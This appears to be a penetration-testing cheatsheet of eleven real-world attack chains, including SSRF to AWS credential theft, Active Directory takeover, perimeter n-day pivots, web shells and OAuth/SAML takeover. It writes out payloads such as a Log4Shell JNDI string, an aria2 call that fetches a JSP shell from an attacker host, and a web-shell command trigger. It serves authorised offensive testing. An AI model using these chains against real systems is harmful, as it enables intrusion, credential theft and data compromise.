---
title: "Attack Chains (Real-World Kill Chains)"
type: cheatsheet
tags: [cheatsheet, attack-chain, methodology, kill-chain, exploitation]
date_created: 2026-06-16
date_updated: 2026-06-16
sources: []
---

# Attack Chains

Proven end-to-end paths from how real engagements actually win. Each step links the technique/payload/tool to use. Find targets via [[recon-dorks]]; exploit perimeter via [[cve-arsenal]].

## 1. Web SSRF -> cloud account takeover
**Scenario:** a fetch/preview/PDF feature on an internet app hosted in AWS.
1. Find SSRF (URL param, webhook, [[headless-browser-attacks]]) -> [[ssrf]], payloads [[ssrf]].
2. Hit metadata: `169.254.169.254/latest/meta-data/iam/security-credentials/<role>` -> [[imds-cloud-metadata]].
3. Use the role creds: `aws sts get-caller-identity`, then S3/Secrets/SSM -> [[aws-attacks]], `hunt-cloud`.
4. Privesc the role (`iam__privesc_scan`) -> [[pacu]] -> admin / cross-account.
**Impact:** cloud account compromise from one unauth web bug.

## 2. Exposed .git -> source -> creds -> RCE
1. `/.git/` exposed ([[recon-dorks]] / nuclei) -> dump with git-dumper -> [[git-exposure]].
2. Read source: hardcoded DB/API creds, admin paths, JWT secret -> [[secret-hunting]], [[source-audit-checklist]].
3. Log into the admin panel (or reuse creds elsewhere) -> [[default-credentials]].
4. Admin feature -> file upload / template / SQL -> RCE -> [[file-upload]] / [[ssti]] / [[sql-injection]].
**Impact:** unauth source disclosure -> authenticated RCE.

## 3. AD: foothold -> Domain Admin
1. Network access, no creds: null/anon SMB+LDAP, Responder ([[responder]]) NetNTLMv2.
2. User list -> lockout-safe spray (`Season2025!`) -> a valid cred -> `hunt-ad`.
3. Roast: AS-REP / Kerberoast -> crack ([[hashcat]]) -> [[kerberos-attacks]].
4. BloodHound ([[bloodhound]]) -> shortest path: ACL abuse, ADCS ESC1 ([[adcs]], [[certipy]]), or DCSync.
5. DA -> golden ticket / krbtgt -> [[ad-persistence]].
**Impact:** full domain compromise.

## 4. Perimeter n-day -> internal pivot
1. Dork/Shodan a vulnerable edge box ([[recon-dorks]]): Fortinet/Citrix/Confluence/Ivanti.
2. Pre-auth RCE from [[cve-arsenal]] (e.g. CVE-2024-21762, Citrix Bleed, CVE-2023-22515).
3. Foothold -> tunnel internal: [[ligolo-ng]] / [[chisel]] -> [[pivoting-tunneling]].
4. Internal recon -> AD (chain 3) or sensitive apps.
**Impact:** internet -> internal network from one CVE.

## 5. File upload -> web shell -> local root
1. Upload bypass (ext/magic/`.htaccess`) -> web shell -> [[file-upload]], payloads [[file-upload]].
2. `id` = www-data -> enumerate ([[pspy]], linpeas) -> [[linux-privesc]].
3. Kernel/sudo/SUID privesc: PwnKit / Baron Samedit / Dirty Pipe -> [[cve-arsenal]].
**Impact:** unauth upload -> root on the host.

## 6. Log4Shell anywhere -> RCE -> cloud
1. Inject `${jndi:ldap://OOB/a}` into any logged field (User-Agent, X-Forwarded-For, username) -> OOB hit confirms.
2. Serve the JNDI payload (marshalsec/rogue-jndi) -> RCE on the app.
3. From RCE -> IMDS creds (chain 1) or internal pivot.
**Impact:** one logged string -> RCE -> cloud/internal.

## 7. OAuth/SAML -> account takeover
1. `redirect_uri` bypass or SAML XSW/sig-strip -> steal code/assertion -> [[oauth-attacks]] / [[saml-attacks]], payloads [[oauth-saml]].
2. Replay -> log in as victim/admin -> [[account-takeover]], `hunt-federation`.
**Impact:** SSO break -> ATO of any user.

## 8. Secret in JS/repo -> API -> mass data (BOLA)
1. JS bundle / GitHub dork -> leaked API key/token -> [[recon-dorks]], [[secret-hunting]].
2. Hit the API: BOLA/IDOR object swap, mass assignment -> [[api-security]], payloads [[api]].
**Impact:** bulk PII / cross-tenant data from a leaked key.

## 9. Subdomain takeover -> trusted-domain abuse
1. Dangling CNAME to an unclaimed service (S3/Heroku/Azure) -> claim it -> [[subdomain-takeover]].
2. Host phishing / steal `SameSite` cookies / bypass CSP from the trusted subdomain.
**Impact:** content + cookies under the victim's own domain.

## 10. Bug-bounty quick wins (breadth)
`subfinder -> httpx -> nuclei -tags cve,kev,exposure -> gowitness` -> review grid -> exposed panel / default creds / takeover / `.env` / actuator. Tools: [[subfinder]], [[httpx]], [[nuclei]], [[gowitness]].

## 11. Unauth service RPC -> arbitrary file write -> RCE (aria2 / Tomcat)
**Scenario:** an unauthenticated RPC/API that can write files, colocated with a service that executes what it writes.
1. Find the unauth control plane: aria2 JSON-RPC (`:6800`, default no secret, `rpc-secure:false`), a WebUI backend, etc. Confirm + fingerprint the running user via `aria2.getGlobalOption` (`conf-path`/`dir` reveal the home, e.g. runs as **tomcat**).
2. Abuse its file-write primitive: `aria2.addUri(["http://LHOST/shell.jsp"], {"dir":"/opt/tomcat/webapps/ROOT","out":"shell.jsp"})` drops your file into a dir the neighbour service executes (Tomcat webroot -> JSP RCE; or `~/.ssh/authorized_keys` for that user).
3. Trigger it: `curl http://T:8080/shell.jsp?cmd=id` -> shell as the service user.
**Impact:** zero-auth network service -> RCE. Generalises to any "download-to-arbitrary-path" daemon (aria2, some CI agents, exposed backup/restore APIs) next to a webroot or a writable `authorized_keys`. See [[file-upload]] for the write-then-execute pattern, [[linux-privesc]] to escalate onward.

## Notes
OOB-gate every blind step (SSRF/RCE/deser). Capture creds/hosts into `targets/<eng>/` as you go; reuse loot before researching new paths. Pick the chain from what recon/fingerprints surface (next-move / `playbook.json`).
